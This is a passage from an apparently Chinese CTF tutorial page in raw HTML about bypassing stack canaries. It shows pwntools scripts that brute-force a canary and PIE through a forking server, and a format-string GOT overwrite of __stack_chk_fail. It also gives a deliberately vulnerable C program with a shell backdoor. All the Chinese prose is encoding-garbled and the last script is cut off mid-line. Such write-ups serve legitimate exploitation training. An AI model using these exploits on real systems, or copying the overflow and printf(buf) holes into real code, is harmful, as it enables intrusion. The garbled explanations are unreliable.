ËøòÊúâÂ≠óÁ¨¶‰∏≤ÊÆµ„ÄÅÁ¨¶Âè∑Ë°®ÊÆµË°åÂè∑Ë°®ÊÆµÁ≠â\n+---------------+\n</code></pre>\n<h6 id=\"Ê£ÄÊü•\"><a class=\"markdownIt-Anchor\" href=\"#Ê£ÄÊü•\">#</a> Ê£ÄÊü•</h6>\n<p><img data-src=\"/img/canary/image-20230608174423723.png\" alt=\"image-20230608174423723\"></p>\n<p>‰øùÊä§ÂºÄÁöÑÂæàÂÖ®Èù¢Âìà</p>\n<h6 id=\"ida-3\"><a class=\"markdownIt-Anchor\" href=\"#ida-3\">#</a> ida</h6>\n<p><em>main</em></p>\n<p><img data-src=\"/img/canary/image-20230608174639174.png\" alt=\"image-20230608174639174\"></p>\n<p><em>canary</em></p>\n<p><img data-src=\"/img/canary/image-20230608174749268.png\" alt=\"image-20230608174749268\"></p>\n<p><em>backdoor</em></p>\n<p><img data-src=\"/img/canary/image-20230608174818492.png\" alt=\"image-20230608174818492\"></p>\n<p>ËøôÊòØ‰∏Ä‰∏™Â≠êÁ∫øÁ®ãË¶ÜÁõñ canaryÔºåÈ¶ñÂÖà <code>fork</code>  ‰∏Ä‰∏™Â≠êÁ∫øÁ®ãÔºåÁÑ∂ÂêéÂú®Â≠êÁ∫øÁ®ãÂÜÖËøõË°åÊìç‰ΩúÔºåËøôÈáåÊàë‰ª¨ÈúÄË¶ÅÁü•ÈÅìÁöÑÊòØÔºåfork Êìç‰Ωú‰∏≠Â≠êÁ∫øÁ®ãÂíå‰∏ªÁ∫øÁ®ãÁî®ÁöÑÊòØ‰∏Ä‰∏™ canary. Âπ∂‰∏îÁ®ãÂ∫è‰∏≠Ëøô‰∏Ä‰∏™Âæ™ÁéØËøò‰∏ç‰ºöÁªàÊ≠¢ÔºåËøôÂ∞±Ë∑ü‰æø‰∫éÊàë‰ª¨ÂØπ canary ÁöÑÁàÜÁ†¥ÔºåÈÄöËøá‰∏ãÈù¢ÁöÑÊ±áÁºñ‰ºöÊõ¥Ê∏ÖÊô∞ÁöÑ‰∫ÜËß£Â≠êÁ∫øÁ®ãÂíåÁà∂Á∫øÁ®ãÁöÑÂÖ≥Á≥ª„ÄÇ</p>\n<p><img data-src=\"/img/canary/22.jpg\" alt=\"22\"></p>\n<p>ÊÄª‰πãÔºåÈÄöËøá forkÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄêÂ≠óËäÇÁàÜÁ†¥ canary„ÄÇ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=remote('',)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'welcome\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># 32 ‰ΩçÁ®ãÂ∫èÁàÜ 3.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"fun\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                canary <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"canary: \"</span> <span class=\"token operator\">+</span> canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>Êé•‰∏ãÊù•ÁàÜ Pie„ÄÇ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>catflag <span class=\"token operator\">=</span> <span class=\"token number\">0x0231</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">#pause()</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"welcome\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                catflag <span class=\"token operator\">+=</span> <span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"NSSCTF\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h6 id=\"exp-3\"><a class=\"markdownIt-Anchor\" href=\"#exp-3\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=remote('',)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'welcome\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># 32 ‰ΩçÁ®ãÂ∫èÁàÜ 3.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"fun\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                canary <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"canary: \"</span> <span class=\"token operator\">+</span> canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">break</span>   </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>catflag <span class=\"token operator\">=</span> <span class=\"token number\">0x0231</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">#pause()</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"welcome\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                catflag <span class=\"token operator\">+=</span> <span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"NSSCTF\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ÊñπÊ≥ïÂõõ-Âä´ÊåÅ__stack_chk_failÂáΩÊï∞\"><a class=\"markdownIt-Anchor\" href=\"#ÊñπÊ≥ïÂõõ-Âä´ÊåÅ__stack_chk_failÂáΩÊï∞\">#</a> ÊñπÊ≥ïÂõõ Âä´ÊåÅ__stack_chk_fail ÂáΩÊï∞</h3>\n<h5 id=\"ÂéüÁêÜ-4\"><a class=\"markdownIt-Anchor\" href=\"#ÂéüÁêÜ-4\">#</a> ÂéüÁêÜ</h5>\n<p>Âú®ÂºÄÂêØ canary ‰øùÊä§ÁöÑÁ®ãÂ∫è‰∏≠ÔºåÂ¶ÇÊûú canary ‰∏çÂØπÔºåÁ®ãÂ∫è‰ºöËΩ¨Âà∞<strong> stack_chk_fail ÂáΩÊï∞ÊâßË°å</strong>„ÄÇstack_chk_fail ÂáΩÊï∞ÊòØ‰∏Ä‰∏™ÊôÆÈÄöÁöÑÂª∂ËøüÁªëÂÆöÂáΩÊï∞ÔºåÂèØ‰ª•ÈÄöËøá‰øÆÊîπ GOT Ë°®Âä´ÊåÅËøô‰∏™ÂáΩÊï∞„ÄÇ</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// scf.c</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">getshell</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// Ê†àÊ∫¢Âá∫</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ gcc scf.c <span class=\"token parameter variable\">-m32</span> -fstack-protector -no-pie <span class=\"token parameter variable\">-z</span> noexecstack <span class=\"token parameter variable\">-z</span> norelro <span class=\"token parameter variable\">-o</span> scf</pre></td></tr></table></figure><ul>\n<li>Âä´ÊåÅÂáΩÊï∞ÈúÄË¶Å‰øÆÊîπ got Ë°®ÔºåÊâÄ‰ª•Ë¶ÅÂÖ≥Èó≠ relroÔºàRELocation Read OnlyÔºâ</li>\n<li>ÈúÄË¶ÅË∞ÉÁî® getshell ÂáΩÊï∞ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂÖ≥Èó≠ pieÔºàPosition Indenpendent ExecutiveÔºâ</li>\n</ul>\n<h6 id=\"Ê£ÄÊü•-2\"><a class=\"markdownIt-Anchor\" href=\"#Ê£ÄÊü•-2\">#</a> Ê£ÄÊü•</h6>\n<p><img data-src=\"/img/canary/image-20230804093940998.png\" alt=\"image-20230804093940998\"></p>\n<h6 id=\"ida-4\"><a class=\"markdownIt-Anchor\" href=\"#ida-4\">#</a> ida</h6>\n<p><img data-src=\"/img/canary/image-20230804094426572.png\" alt=\"image-20230804094426572\"></p>\n<p><img data-src=\"/img/canary/image-20230804094442002.png\" alt=\"image-20230804094442002\"></p>\n<ul>\n<li>Êúâ‰∏™ getshell ÂêéÈó®</li>\n<li>main ÂáΩÊï∞‰∏≠ printf Áõ¥Êé•ÊâìÂç∞‰∫ÜÁî®Êà∑ËæìÂÖ•ÁöÑÂÜÖÂÆπÔºåÂ≠òÂú®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºåÂèØ‰ª•Áî®Êù•Âêë‰ªªÊÑèÂú∞ÂùÄÂÜôÂÖ•Êï∞ÊçÆ</li>\n</ul>\n<p><strong><u>GOT Ë°®‰∏≠Â≠òÂÇ®ÁöÑÊòØÂáΩÊï∞ÁöÑÂÆûÈôÖÂú∞ÂùÄÔºåÂ¶ÇÊûúÊää <code>__stack_chk_fail</code>  ÂáΩÊï∞ÁöÑ got Ë°®Âú∞ÂùÄÊõøÊç¢‰∏∫ getshell ÁöÑÂú∞ÂùÄÔºåÂú® canary Âá∫ÈîôÁöÑÊÉÖÂÜµ‰∏ãÔºåË∞ÉÁî® <code>__stack_chk_fail</code>  Êó∂Â∞±‰ºöÁõ¥Êé•Ëé∑ÂèñÂà∞ shell„ÄÇ</u></strong></p>\n<p>ËøôÈáåÂà©Áî® pwntools ‰∏≠ÁöÑ fmtstr_payload () ÂèØ‰ª•Êñπ‰æøÁöÑËøõË°åÂú∞ÂùÄÁöÑÁØ°Êîπ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fmtstr_payload<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span> writes<span class=\"token punctuation\">,</span> numbwritten<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> write_size<span class=\"token operator\">=</span>‚Äòbyte‚Äô<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>offsetÔºà<span class=\"token builtin\">int</span>Ôºâ<span class=\"token punctuation\">:</span> Â≠óÁ¨¶‰∏≤ÁöÑÂÅèÁßª</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>writes <span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> Ê≥®ÂÖ•ÁöÑÂú∞ÂùÄÂíåÂÄºÔºå<span class=\"token punctuation\">&#123;</span>target_addr <span class=\"token punctuation\">:</span> change_to<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ÊâãÂ∑•Á°ÆËÆ§Â≠óÁ¨¶‰∏≤ÁöÑÂÅèÁßª</p>\n<p><img data-src=\"/img/canary/image-20230804094756512.png\" alt=\"image-20230804094756512\"></p>\n<p><code>61616161</code>  ÊòØÁ¨¨ 10 ‰∏™‰ΩçÁΩÆÔºåÂõ†Ê≠§ offset Âèñ 10</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span>stack_chk_fail_got<span class=\"token punctuation\">:</span> getshell<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ËøòË¶ÅÈÄ†Êàê‰∏ÄÊ¨°Ê∫¢Âá∫ÔºåËß¶Âèë <code>__stack_chk_fail</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h6 id=\"exp-4\"><a class=\"markdownIt-Anchor\" href=\"#exp-4\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./scf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./scf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span 